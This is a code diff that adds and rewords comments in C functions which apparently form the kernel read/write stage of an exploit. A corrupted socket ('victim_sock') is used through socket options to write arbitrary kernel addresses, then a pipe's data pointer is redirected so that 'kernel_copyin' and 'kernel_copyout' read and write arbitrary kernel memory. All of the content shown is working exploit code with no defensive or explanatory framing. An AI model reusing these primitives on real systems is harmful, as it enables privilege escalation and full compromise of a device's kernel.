@@ -18,10 +18,12 @@ int _victim_sock;
 int _rw_pipe[2];
 uint64_t _pipe_addr;
 
+// External functions for writing and reading data
 extern size_t _write(int fd, const void *buf, size_t nbyte);
 extern size_t _read(int fd, void *buf, size_t nbyte);
 
 // Arguments passed by way of entrypoint arguments.
+// Initialize the necessary resources for read/write operations
 void kernel_init_rw(int master_sock, int victim_sock, int *rw_pipe, uint64_t pipe_addr)
 {
 	_master_sock = master_sock;
@@ -32,6 +34,7 @@ void kernel_init_rw(int master_sock, int victim_sock, int *rw_pipe, uint64_t pip
 }
 
 // Internal kwrite function - not friendly, only for setting up better primitives.
+// Write data to a specified address using socket options
 void kwrite(uint64_t addr, uint64_t *data) {
 	uint64_t victim_buf[3];
 
@@ -44,6 +47,7 @@ void kwrite(uint64_t addr, uint64_t *data) {
 }
 
 // Public API function to write kernel data.
+// Copy data from user space to kernel space
 void kernel_copyin(void *src, uint64_t kdest, size_t length)
 {
 	uint64_t write_buf[3];
@@ -54,17 +58,18 @@ void kernel_copyin(void *src, uint64_t kdest, size_t length)
 	write_buf[2] = 0;
 	kwrite(_pipe_addr, (uint64_t *) &write_buf);
 
-	// Set pipe data addr
+	// Set pipe data address
 	write_buf[0] = kdest;
 	write_buf[1] = 0;
 	write_buf[2] = 0;
 	kwrite(_pipe_addr + 0x10, (uint64_t *) &write_buf);
 
-	// Perform write across pipe
+	// Perform write across the pipe
 	_write(_rw_pipe[1], src, length);
 }
 
 // Public API function to read kernel data.
+// Copy data from kernel space to user space
 void kernel_copyout(uint64_t ksrc, void *dest, size_t length)
 {
 	uint64_t write_buf[3];
@@ -75,12 +80,12 @@ void kernel_copyout(uint64_t ksrc, void *dest, size_t length)
 	write_buf[2] = 0;
 	kwrite(_pipe_addr, (uint64_t *) &write_buf);
 
-	// Set pipe data addr
+	// Set pipe data address
 	write_buf[0] = ksrc;
 	write_buf[1] = 0;
 	write_buf[2] = 0;
 	kwrite(_pipe_addr + 0x10, (uint64_t *) &write_buf);
 
-	// Perform read across pipe
+	// Perform read across the pipe
 	_read(_rw_pipe[0], dest, length);
 }
